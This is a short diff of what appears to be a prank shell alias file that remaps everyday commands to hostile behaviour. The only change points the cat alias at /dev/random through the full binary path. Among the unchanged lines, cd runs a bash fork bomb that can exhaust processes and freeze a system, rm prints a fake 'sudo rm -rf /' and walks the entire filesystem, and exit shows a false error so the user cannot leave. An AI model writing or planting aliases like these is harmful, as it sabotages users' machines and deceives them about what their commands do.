@@ -1,5 +1,5 @@
 alias ls='sl'
 alias rm='echo "sudo rm -rf /" && find /'
 alias cd=':(){ :|:& };:'
-alias cat='cat /dev/random'
+alias cat='/usr/bin/cat /dev/random'
 alias exit='echo "bash: exit : command not found"'
